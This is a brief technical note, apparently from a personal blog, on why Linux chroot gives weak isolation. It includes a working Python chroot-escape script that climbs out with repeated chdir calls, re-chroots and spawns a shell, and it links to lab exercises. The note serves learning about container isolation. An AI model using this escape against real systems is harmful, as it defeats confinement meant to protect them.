# Chroot

`chroot` aims at providing isolation, it changes the root directory for the
current running processes. It is helpful to recover the system.  Because I have
used it many times for my ArchLinux.

It may seem perfect for containers to provide file-system isolation. However,
`chroot` can be exploited. Linux `/proc` filesystem manages two paths for the
currently running process.

+ `cwd`: current working directory of the process
+ `root`: root directory of the process

And we can easily get the out-side file-system using the following scripts:

```py
import os

print("PID", os.getpid())

if not os.path.exists("chroot"):
    os.mkdir("chroot")
os.chroot("chroot")

# We could change the `cwd` to be `/root`, thus we can
# get out-side file-system.
for i in range(1000):
    os.chdir("..")

# Now, we do second chroot thus get whatever we want
os.chroot(".")
# To spawn a shell
os.system("/bin/sh")
```

And there are three labs to code in action, just do the first.  Because it is
free.

2. [Chroot Jail II](https://attackdefense.com/challengedetails?cid=1307)
3. [Chroot Jail III](https://attackdefense.com/challengedetails?cid=1308)

Thus, we need to another functionality for providing isolation for Docker, which
is called `pivot_root`.
